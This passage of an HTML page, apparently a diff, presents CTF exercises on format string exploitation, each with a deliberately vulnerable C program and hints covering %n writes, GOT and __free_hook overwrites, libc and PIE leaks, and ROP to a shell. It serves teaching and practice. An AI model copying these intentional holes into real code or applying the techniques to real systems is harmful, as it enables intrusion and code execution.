+<pre><code class="language-c">// fmtwin.c - gcc -o fmtwin fmtwin.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int authorized = 0;
+
+int main() {
+    char buf[128];
+    printf("authorized @ %p\n", &amp;authorized);
+    printf("Input: ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    if (authorized == 0x1337) {
+        system("cat flag.txt");
+    } else {
+        printf("\nNot authorized (0x%x)\n", authorized);
+    }
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>You need to write <code>0x1337</code> (4919 decimal) to the address of <code>authorized</code>. Use <code>%hn</code> (2-byte write). Place the address of <code>authorized</code> in your format string at your offset, then use <code>%4919c%N$hn</code> (adjusting for bytes already printed from the address).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Full Exploit Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Combine format string leak + GOT overwrite + libc one_gadget for a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fullchain.c - gcc -o fullchain fullchain.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    char buf[128];
+    while (1) {
+        printf(">> ");
+        fgets(buf, 128, stdin);
+        if (buf[0] == 'q') break;
+        printf(buf);
+    }
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> Leak a libc address (look for <code>0x7f...</code> values with <code>%p</code>). Calculate libc base.<br>
+            <strong>Step 2:</strong> Find a one_gadget in the libc version (<code>one_gadget ./libc.so.6</code>).<br>
+            <strong>Step 3:</strong> Overwrite <code>GOT[printf]</code> with the one_gadget address using <code>fmtstr_payload</code>.<br>
+            <strong>Step 4:</strong> Next printf call triggers your one_gadget → shell.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: ASLR Bypass via Leak</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">ASLR is on, PIE is off. Leak a libc address to calculate <code>system()</code> and overwrite GOT.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// aslrbypass.c - gcc -o aslrbypass aslrbypass.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    setbuf(stdout, NULL);
+    char buf[128];
+    while (1) {
+        printf("cmd> ");
+        fgets(buf, 128, stdin);
+        if (buf[0] == 'x') break;
+        printf(buf);
+    }
+    puts("Bye!");  // target after GOT overwrite
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Iteration 1: Leak a <code>0x7f...</code> address from the stack. Identify it in GDB (e.g., <code>__libc_start_main+243</code>). Calculate libc base.<br>
+            Iteration 2: <code>fmtstr_payload(offset, {elf.got['puts']: libc.symbols['system']})</code><br>
+            Iteration 3: Send <code>x</code> to break the loop — <code>puts("Bye!")</code> becomes <code>system("Bye!")</code>. Better: overwrite <code>GOT[printf]</code> and send <code>/bin/sh</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Format String + ROP Combo</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Leak canary + libc via format string, then ROP to shell via buffer overflow.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtrop.c - gcc -o fmtrop fmtrop.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void feedback() {
+    char comment[128];
+    printf("Comment: ");
+    fgets(comment, 128, stdin);
+    printf("Thanks, ");
+    printf(comment);  // format string here
+    printf("\n");
+}
+
+void survey() {
+    char response[32];
+    printf("Survey: ");
+    gets(response);  // overflow here
+}
+
+int main() {
+    feedback();
+    survey();
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>feedback():</strong> Leak canary + libc return address with <code>%p</code> direct parameter access.<br>
+            <strong>survey():</strong> Overflow <code>response</code> with: padding + canary + rbp + ROP chain.<br>
+            ROP chain: <code>pop rdi; ret</code> → <code>&amp;"/bin/sh"</code> → <code>system()</code> (all from libc).<br>
+            Don't forget the <code>ret</code> gadget for stack alignment on Ubuntu.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Blind Format String</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The server processes your format string but only returns "OK". Get a shell without seeing output.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// blindfmt.c - gcc -o blindfmt blindfmt.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+void prize() { execve("/bin/sh", NULL, NULL); }
+
+int main() {
+    char buf[128];
+    setbuf(stdout, NULL);
+    while (1) {
+        int n = read(0, buf, 127);
+        buf[n] = '\0';
+        if (!strcmp(buf, "quit\n")) break;
+        // Process format string internally
+        char out[512];
+        snprintf(out, 512, buf);   // vulnerable
+        write(1, "OK\n", 3);       // only feedback
+    }
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>You can't read output, but <code>%n</code> writes still work! Since the binary is no-PIE and no-RELRO, all addresses are fixed. <code>snprintf</code> supports <code>%n</code> in older glibc. Overwrite <code>GOT[strcmp]</code> or <code>GOT[write]</code> with <code>prize()</code>. Use <code>fmtstr_payload</code> — the write happens even though you only see "OK".</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: PIE Bypass via Leak</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">PIE is enabled — leak a code address, compute base, then redirect execution.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// piefmt.c - gcc -o piefmt piefmt.c -pie -fPIE -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void secret() { system("cat flag.txt"); }
+
+int main() {
+    char buf[128];
+    setbuf(stdout, NULL);
+    // Round 1
+    printf("Round 1> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    // Round 2
+    printf("Round 2> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    puts("Done.");
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Round 1:</strong> Leak a PIE address (<code>0x55...</code> or <code>0x56...</code>) from the stack. In GDB, identify the symbol (e.g., <code>main+XX</code> or <code>__libc_csu_init</code>). Compute <code>pie_base = leak - offset</code>.<br>
+            <strong>Round 2:</strong> Now you know the real address of <code>secret()</code> and all GOT entries. Use <code>fmtstr_payload</code> to overwrite <code>GOT[puts]</code> with <code>secret()</code>. The final <code>puts("Done.")</code> triggers your function.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Multiple Writes</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Write multiple values simultaneously to pass a three-part authentication check.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// multiwrite.c - gcc -o multiwrite multiwrite.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int key1 = 0, key2 = 0, key3 = 0;
+
+int main() {
+    char buf[256];
+    printf("key1@%p key2@%p key3@%p\n", &amp;key1, &amp;key2, &amp;key3);
+    printf("Input: ");
+    fgets(buf, 256, stdin);
+    printf(buf);
+    if (key1 == 0xCAFE &amp;&amp; key2 == 0xBABE &amp;&amp; key3 == 0xDEAD) {
+        system("cat flag.txt");
+    } else {
+        printf("\nkeys: 0x%x 0x%x 0x%x\n", key1, key2, key3);
+    }
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>fmtstr_payload(offset, {key1: 0xCAFE, key2: 0xBABE, key3: 0xDEAD}, write_size='short')</code>. Pwntools handles ordering the writes (smallest value first) and computing padding automatically. Parse the printed addresses to get exact locations.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Overwrite __free_hook</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Overwrite <code>__free_hook</code> with <code>system()</code>, then trigger <code>free("/bin/sh")</code> for a shell. (glibc &lt; 2.34)</p>
+          <div class="setup-code">
+<pre><code class="language-c">// freehook.c - gcc -o freehook freehook.c -no-pie -Wl,-z,norelro
+// Requires glibc &lt; 2.34 (hooks removed in 2.34+)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    setbuf(stdout, NULL);
+    char buf[128];
+    // Format string
+    while (1) {
+        printf("fmt> ");
+        fgets(buf, 128, stdin);
+        if (buf[0] == '!') break;
+        printf(buf);
+    }
+    // After break, allocate and free user input
+    char *ptr = malloc(64);
+    printf("data> ");
+    fgets(ptr, 64, stdin);
+    ptr[strcspn(ptr, "\n")] = 0;
+    free(ptr);  // if __free_hook == system, this calls system(ptr)
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Step 1: Leak libc from stack (<code>%p</code>) to compute <code>libc_base</code>.<br>
+            Step 2: Calculate <code>__free_hook = libc_base + libc.symbols['__free_hook']</code> and <code>system = libc_base + libc.symbols['system']</code>.<br>
+            Step 3: <code>fmtstr_payload(offset, {free_hook_addr: system_addr})</code>.<br>
+            Step 4: Send <code>!</code> to exit loop. At data prompt, send <code>/bin/sh</code>. <code>free(ptr)</code> → <code>system("/bin/sh")</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: One-Shot Overwrite</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You get exactly ONE format string. Overwrite GOT in a single shot — no loop, no second chance.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// oneshot.c - gcc -o oneshot oneshot.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+int main() {
+    char buf[256];
+    setbuf(stdout, NULL);
+    printf("You get one shot.\n");
+    printf("fmt> ");
+    fgets(buf, 256, stdin);
+    printf(buf);       // your ONE chance
+    printf("\n");
+    puts("Goodbye.");  // overwrite GOT[puts] -> win
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>No loop means you must get the write correct on the first try. Since it's no-PIE and no-RELRO, all addresses are known statically. Use <code>fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})</code>. Find the offset by testing locally. The payload must fit in 256 bytes — <code>write_size='short'</code> helps keep it compact. After your printf, the next <code>puts()</code> calls <code>win()</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 11: Format String Race</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A multi-threaded server has a format string bug. Exploit a TOCTOU race with format string writes.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtrace.c - gcc -o fmtrace fmtrace.c -no-pie -Wl,-z,norelro -lpthread
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+
+int authorized = 0;
+
+void *checker(void *arg) {
+    sleep(2);
+    if (authorized) {
+        system("cat flag.txt");
+    } else {
+        printf("Access denied.\n");
+    }
+    return NULL;
+}
+
+int main() {
+    pthread_t tid;
+    pthread_create(&amp;tid, NULL, checker, NULL);
+
+    char buf[128];
+    printf("authorized @ %p\n", &amp;authorized);
+    printf("Quick! fmt> ");
+    fgets(buf, 128, stdin);
+    printf(buf);  // race: write authorized before checker wakes up
+
+    pthread_join(tid, NULL);
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The checker thread sleeps for 2 seconds. You have that window to overwrite <code>authorized</code> to a non-zero value using the format string. Use <code>%hhn</code> to write any non-zero byte (e.g., <code>0x01</code>) to the address of <code>authorized</code>. The binary prints the address for you. One-byte write: <code>%1c%N$hhn</code> with the address at offset N.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 12: Change Program Flow</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Overwrite a function pointer stored in a global struct to redirect execution to the flag function.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtflow.c - gcc -o fmtflow fmtflow.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void flag_func() { system("cat flag.txt"); }
+void nop_func()  { printf("Nothing here.\n"); }
+
+struct handler {
+    void (*action)();
+    char name[32];
+} h = { nop_func, "default" };
+
+int main() {
+    char buf[128];
+    printf("handler.action @ %p\n", &amp;h.action);
+    printf("flag_func @ %p\n", flag_func);
+    printf("fmt> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    h.action();  // calls whatever action points to
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The binary tells you exactly where <code>handler.action</code> is and where <code>flag_func</code> is. Use <code>fmtstr_payload(offset, {handler_action_addr: flag_func_addr})</code>. After your printf, <code>h.action()</code> calls <code>flag_func()</code> instead of <code>nop_func()</code>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
